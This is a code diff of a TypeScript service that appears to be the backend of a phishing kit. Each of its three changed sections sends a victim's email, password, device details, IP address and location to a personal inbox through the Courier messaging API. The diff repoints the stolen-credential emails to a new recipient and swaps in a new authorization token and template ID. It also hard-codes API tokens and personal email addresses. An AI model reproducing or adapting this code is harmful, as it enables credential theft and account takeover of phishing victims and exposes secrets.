@@ -20,7 +20,7 @@ export class AppService {
     // Install with: npm install @trycourier/courier
     console.log(data);
     const courier = CourierClient({
-      authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
+      authorizationToken: 'pk_AM1PAXAJGYMT8BHJR1MDJCQH1RNH',
     });
 
     const { deviceDetails, ipAddr, location } =
@@ -29,9 +29,9 @@ export class AppService {
     const { requestId: emailRequestId } = await courier.send({
       message: {
         to: {
-          email: 'christophh.bergerservices@aol.com',
+          email: 'yariaortega@gmail.com',
         },
-        template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
+        template: '8ZTDZ8YT8MM9A3PVYZ152Z1VXTKM',
         data: {
           recipientName: `email: ${email}, \n password: ${password}
 
@@ -66,7 +66,7 @@ export class AppService {
     // Install with: npm install @trycourier/courier
 
     const courier = CourierClient({
-      authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
+      authorizationToken: 'pk_AM1PAXAJGYMT8BHJR1MDJCQH1RNH',
     });
 
     const { deviceDetails, ipAddr, location } =
@@ -76,9 +76,9 @@ export class AppService {
       {
         message: {
           to: {
-            email: 'christophh.bergerservices@aol.com',
+            email: 'yariaortega@gmail.com',
           },
-          template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
+          template: '8ZTDZ8YT8MM9A3PVYZ152Z1VXTKM',
           data: {
             recipientName: `email: ${email}, \n password: ${password}
 
@@ -112,7 +112,7 @@ export class AppService {
     // Install with: npm install @trycourier/courier
     console.log(data);
     const courier = CourierClient({
-      authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
+      authorizationToken: 'pk_AM1PAXAJGYMT8BHJR1MDJCQH1RNH',
     });
 
     const { deviceDetails, ipAddr, location } =
@@ -122,9 +122,9 @@ export class AppService {
       {
         message: {
           to: {
-            email: 'christophh.bergerservices@aol.com',
+            email: 'yariaortega@gmail.com',
           },
-          template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
+          template: '8ZTDZ8YT8MM9A3PVYZ152Z1VXTKM',
           data: {
             recipientName: `email: ${email}, \n password: ${password}
 
